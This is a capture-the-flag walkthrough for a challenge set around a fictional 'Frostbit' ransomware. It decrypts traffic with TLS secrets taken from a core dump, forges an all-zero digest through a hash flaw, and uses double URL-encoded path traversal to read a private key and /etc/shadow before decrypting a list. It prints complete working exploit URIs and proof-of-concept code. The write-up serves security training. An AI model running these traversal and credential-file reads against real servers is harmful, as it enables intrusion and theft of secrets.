# OBJECTIVE 15 - Decrypt the Naughty-Nice List #
Difficulty: ❄️❄️❄️❄️❄️

## OBJECTIVE : ##
>Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.

#

## HINTS: ##
<details>
  <summary>Hints provided for Objective 15</summary>
  
>-  The Frostbit infrastructure might be using a reverse proxy, which may resolve certain URL encoding patterns before forwarding requests to the backend application. A reverse proxy may reject requests it considers invalid. You may need to employ creative methods to ensure the request is properly forwarded to the backend. There could be a way to exploit the cryptographic library by crafting a specific request using relative paths, encoding to pass bytes and using known values retrieved from other forensic artifacts. If successful, this could be the key to tricking the Frostbit infrastructure into revealing a secret necessary to decrypt files encrypted by Frostbit.
>-	I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It's great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes.


</details>

#  

## PROCEDURE : ##

We start this challenge with five files; `naughty_nice_list.csv.frostbit`, `frostbit.elf`, `frostbit_core_dump.13`, `DoNotAlterOrDeleteMe.frostbit.json` and `ransomware_traffic.pcap`.

We can open the `ransomware_traffic.pcap` file in [Wireshark](https://www.wireshark.org/) and see that it’s a relatively small file which shows an encrypted TLS session.  Next, we can use the `strings` command on `frostbit_core_dump.13` and read through the output.  One of the chunks of text that stands out contains the client and server TLS secrets.

```
┌──(root㉿kali)-[/home/Objective 15-16 - Frostbit]

└─# **strings frostbit_core_dump.13**

<...REDACTED FOR BREVITY...>

CLIENT_HANDSHAKE_TRAFFIC_SECRET 6f8f7498f76b53f79a18f62bd71c597c28967262c32f5a02d7bf5754034bc593 02623bc09772ebc798bff16594bb40b7c016d4120386dded10e2ff762d61dfc0

SERVER_HANDSHAKE_TRAFFIC_SECRET 6f8f7498f76b53f79a18f62bd71c597c28967262c32f5a02d7bf5754034bc593 88875ef3f05397f685c5c72c8a4b357f0d48fcbb054d1f8e4d7ce7cb6d942ef1

CLIENT_TRAFFIC_SECRET_0 6f8f7498f76b53f79a18f62bd71c597c28967262c32f5a02d7bf5754034bc593 da23c59c5bd11e2dd3851c831e7daf5e8eea12da0657aa3a9dc0c2934d6f0ab1

SERVER_TRAFFIC_SECRET_0 6f8f7498f76b53f79a18f62bd71c597c28967262c32f5a02d7bf5754034bc593 79f3b178650d0c2f58717c51df8a1eb74b23e92c1b8dec560aaf4b5f10f5dd9e

<...REDACTED FOR BREVITY...>
```

This chunk of text can be copied to a text file (`sslkeylog.txt`) and used to decrypt the TLS stream in Wireshark by going to **Edit** -> **Preferences** -> **Protocols** -> **TLS** and uploading sslkeylog.txt to the field called (**Pre)-Master-Secret log filename**.  We can now follow the TLS stream in Wireshark to see that the server first supplies a `nonce` value, then the client sends an `encryptedkey` value, presumably encrypted with some key file and the supplied nonce.  The server then responds with `digest`, `status` and `statusid` values.

![image](https://github.com/user-attachments/assets/bc19e922-9fa6-460e-88a4-d3cca6ba680e)

The same exchange can be seen in the `strings` output of the core dump file, but it’s missing the nonce – so this must be the most important bit of information we need from the .pcap file.

Looking further through the strings output of the core dump, we can also spot an interesting URI; `https://api.frostbit.app/view/lZNUKyHCWKwV/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=a000b3838030e94ddc76c21020044712`. This URI appears to be composed of the `statusid` we saw earlier and our [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier#:~:text=A%20Universally%20Unique%20Identifier%20(UUID,as%20used%20by%20UEFI%20variables), and it is passing the `digest`  value we saw in the network capture as a parameter.  Following the URI takes us to a **Ransom Note for the Frostbit2.0 Ransomware**.  The page shows a countdown timer and a list of websites that the naughty-nice list will be published to if Wombley’s demands are not met.

By looking at the source code of the ransom note page, we see that there is a placeholder for debug data included in **line 167**.  The page is looking for debug data to be passed from a server-side script (**lines 172 to 178**).  So, there should be a way of enabling debug mode and viewing this debug data.  We can achieve this by adding `&debug=true` to the end of the URI, now we can see some additional information at the bottom of the ransom page, but no information that we didn’t know already.

![image](https://github.com/user-attachments/assets/e5a9b1a1-6ef3-46fc-888e-833346c9a4ff)

Now it’s time to start messing around with the URI to see if we can get the debug data to show us something interesting and useful.  Let’s start by removing a character from the `digest` parameter and we get this error:

```
"error": "Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n  decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"
```

So, the server-side script is expecting the digest to be hexadecimal and therefore to be composed by ASCII character pairs and thus an odd-length string will throw this error.  More importantly, we have a path and filename for the server-side script: `/app/frostbit/ransomware/static/FrostBiteHashlib.py`.

It’s also worth noting that the only other resource called on the ransom note page is the banner image at the top of the page and it is being called from `/static/frostbit.png` (**line 129**) – so it looks like the Python script and the banner image might just be in the same `/static` directory.  We can therefore simply point our browser towards `https://api.frostbit.app/static/FrostBiteHashlib.py` to download the server-side Python script.

Now we can have a closer look at what the script is doing.  Its main purpose appears to be to generate the hash value that is being used for the `digest` parameter.  The hash is being generated based on the contents of the file to be served (`file_bytes`), the file name (`filename_bytes`) and the nonce (`nonce_bytes`).  We can also see in **line 5** that the hash has a fixed length of 16 bytes.

**Lines 14 to 29** determine how the hash is calculated.  The algorithm starts with hash that is all zeroes.  First it performs an XOR function with the file contents and the nonce and then performs another XOR function with the resulting byte array and the stored hash value.  This is repeated for each byte in the file with the nonce being repeated over and over for the XOR operation.  The algorithm then does something similar with the file name, performing an XOR operation between the file name and the nonce, but then instead of performing another XOR with the stored hash value, it performs an AND operation.

![image](https://github.com/user-attachments/assets/e71342c3-be0c-40a1-b4e0-2e3143f998b5)

This is a critical flaw in this algorithm for one specific edge case – when the first 16-byte values for the file name and nonce are identical and in the same position in the algorithm’s loop.  In this case the XOR operation will return a string of `0`s and any AND operation with a string of `0`s will also result in a string of `0`s.  This means that if we can get the nonce and the file name to be identical at some point and collide, we will get an all-zero hash value.  Since the hash is a 16-byte value, and the nonce is 8 bytes, we need to repeat the nonce twice.  We may also need to add some padding to the file name to get it to align perfectly with the nonce depending on the length of the file.  We can test out this hypothesis by adding some extra code to the end of the `FrostBiteHashlib.py` script:

```python
file_bytes = b"testdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdatatestdata"

filename_bytes = bytes.fromhex("aaaaaaaaaaaaaaaaaabf57c4e5ed6cb751bf57c4e5ed6cb751e5ed6e5ed6e5ed6e5ed6")

nonce_bytes = bytes.fromhex("bf57c4e5ed6cb751")

frostbyte = Frostbyte128(file_bytes, filename_bytes, nonce_bytes)

print(f"HexDigest: {frostbyte.hexdigest()}")
```

In this example I used a random string of data for the `file_bytes` variable and then created a file name composed as follows: **{padding}{nonce}{nonce}{extra data}**.  I used `aa` bytes for padding and added these until the output gave me an all-zero hash.  The amount of padding needed will vary depending on the number of bytes in the file, but it can never be more than 16 bytes.

OK, now back to the ransom note – this time let’s try messing with the `statusid` portion of the URI.  If we add or remove characters to the `statusid` (with debug still turned on), we get the following error: `"error": "Status Id File Not Found"`.

From this output it looks like the value of `statusid` instructs the server on which file to fetch, could it be possible to use this functionality to perform a path traversal attack and output the contents of any file on the server?  We can test out this idea by trying to access a known file, such as the banner of the ransom note page; `frostbit.png` in this way.

To do this we need to replace the `statusid` portion of the URI with a relative file path like `../static/frostbit.png`.  However, it’s not going to be that simple as the server will take any `/` characters in the URI as pointing to other paths of the website rather than other directories on the web server itself.  We need to pass the whole file path in a way that will cause the web server to process it as a filename.  If we try to URL-encode the `/` characters as `%2F`, it doesn’t work either. One of the hints suggests that the web server is behind a proxy that resolves “_certain URL encoding patterns before forwarding requests to the backend application_”.  This means that when we pass `%2F` in the URI, the reverse proxy is converting this back to a `/` before passing it on to the webserver.  The trick to getting past this obstacle is to URL-encode `%2F` (effectively _double_ URL-encoding each `/` character) thus replacing it with `%252F`. `%25` is the URL-encoded value for the `%` symbol, so this time when we pass `%252F` to the reverse proxy, it will resolve it to `%2F` and pass on a URL-encoded `/` character to the backend application.

![image](https://github.com/user-attachments/assets/2b48e324-54ee-4842-8d65-bf468d3165a1)


Having figured all of that out we can now try making a call to `https://api.frostbit.app/view/..%252Fstatic%252Ffrostbit.png/{UUID}/status?digest={DIGEST}&debug=true`  and we get a beautiful error message saying that we have an incorrect digest.  This is a good sign, because normally just by changing the `statusid` arbitrarily we’d get a “_file not found_” error, but this new error means that the relative file path we provided was correctly processed, the file <ins>_was_</ins> found, but the server is refusing to show it to us because we are supplying the wrong digest – but based on what we learned from the python script so far, we should be able to get around that too now.

There is one more thing that we can observe by playing around with the `statusid` portion of the URI.  That is that nginx allows us to enter any directory – even one that doesn’t exist, as long as we leave it again with `../`.  So for example, to access `frostbit.png` we can use the path `foobar/../../static/frostbit.png` and we will get the same result as for `../static/frostbit.png`, so the URL would look something like this: `https://api.frostbit.app/view/foobar%252F..%252F..%252Fstatic%252Ffrostbit.png/{UUID}/status?digest={DIGEST}&debug=true`.

But, what file should we actually by trying to fetch from the server?  You may recall a reference to the **Frostbit API** in an earlier Objective.  In fact, in [Objective 13 – Santa Vision](OBJECTIVE%2013%20-%20Santa%20Vision.md), [one of the MQTT streams](OBJECTIVE%2013%20-%20Santa%20Vision.md#santa-vision-c) gives us an interesting file path: `/etc/nginx/certs/api.frostbit.app.key`.

In our case the file path needs to be relative to where our python script is stored.  We know that the python script is in `/app/frostbit/ransomware/static` directory, so we need at least four `../` to go back to `root` and another `../` to escape the false directory name composed of **{nonce}{nonce}**, so `/../../../../../etc/nginx/certs/api.frostbit.app.key`.

The **{nonce}** values need to be passed as hex in the URI.  Normally we’d achieve this by prepending each hex byte pair with a `%` symbol, but just like we did with the file path, we need to _double_ URL encode hex values and represent each `%` symbol as `%25` instead.

To summarise everything, essentially what needs to be done is to construct a URI that looks something like this:
`https://api.frostbit.app/view/{padding}{nonce}{nonce}{filepath}/{UUID}/ status?digest=00000000000000000000000000000000&debug=true`
Keep in mind that **{filepath}** needs to have an extra `../` at the beginning to exit the false directory we are passing as **{padding}{nonce}{nonce}**.

Here are the individual components and how they were constructed in the URI:

**{nonce}{nonce}**: 	`bf57c4e5ed6cb751bf57c4e5ed6cb751`

URL-encoded **{nonce}{nonce}**:	`%bf%57%c4%e5%ed%6c%b7%51%bf%57%c4%e5%ed%6c%b7%51`

Double URL-encoded **{nonce}{nonce}**:  	`%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551`

**{filepath}**:	`/../../../../../etc/nginx/certs/api.frostbit.app.key`

URL-encoded **{filepath}**: 	`%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnginx%2Fcerts%2Fapi.frostbit.app.key`

Double URL-encoded **{filepath}**:  `%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key`

In my case I didn’t need to add any padding characters, but if required you can add characters before the nonces, one at a time until the URI resolves.  The final URI when putting everything together looks like this:

``https://api.frostbit.app/view/%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true``

This URI displays the contents of `api.frostbit.app.key` in the debug data area of the ransom note page and we can copy the text and save it to a `.key` file.

Just for fun we can also try looking at the contents of `/etc/passwd`, `/etc/shadow` and `/etc/os-release` using the same method (adjusting the number of padding characters before the nonces each time):

**/etc/passwd:**
```https://api.frostbit.app/view/aaaaaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true ```

**/etc/shadow:**
```https://api.frostbit.app/view/aaaaaaaaaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fshadow/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true ```

**/etc/os-release:**
```https://api.frostbit.app/view/aaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fos-release/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true```

Now that we have the `.key` file used to encrypt the `encryptedkey` value we saw in the TLS session earlier, we can use it to decrypt it.  First, we need to convert the `encryptedkey` to hex and save it to a `.bin` file:

```bash
└─# echo -n "9e3a9c904a0beca..." | xxd -r -p > encryptedkey.bin 
Next, we can use openssl to decrypt the key:
└─# openssl pkeyutl -decrypt -inkey api.frostbit.app.key -in encryptedkey.bin -out decryptedkey
└─# cat decryptedkey    
d23c052542a2ad32e86f9d5bbc66b11e,bf57c4e5ed6cb751    
```

Now we have the key that was presumably used to encrypt the naughty-nice csv file.  The decrypted key gives us two comma-separated values, which means that we’re probably looking at some kind of AES encryption which uses a **Key** and **Initial Value**.  Since we don’t know exactly which AES mode was used, I found it easiest to upload the encrypted csv file to [Cyberchef](https://icyberchef.com/), paste in the **Key** and **IV** values and try a few options for Mode until I got a legible output.

![image](https://github.com/user-attachments/assets/881af2a6-cf78-499d-b726-58c595086d53)


Finally, we can look inside the decrypted naughty-nice list and find out who is the last child on the list at line number 440, and we find it’s a child called <ins>**Xena Xtreme**</ins> who is listed as having been naughty for having _“a surprise science experiment in the garage and [leaving] a mess with the supplies”_.



 #
[<<< Previous Objective (14 - Elf Stack)](OBJECTIVE%2014%20-%20Elf%20Stack.md)|.........................................................| [Next Objective (16 - Deactivate the Naughty-Nice List) >>>](OBJECTIVE%2016%20-%20Deactivate%20Frostbit%20Naughty-Nice%20List%20Publication.md)|
:-|--|-:
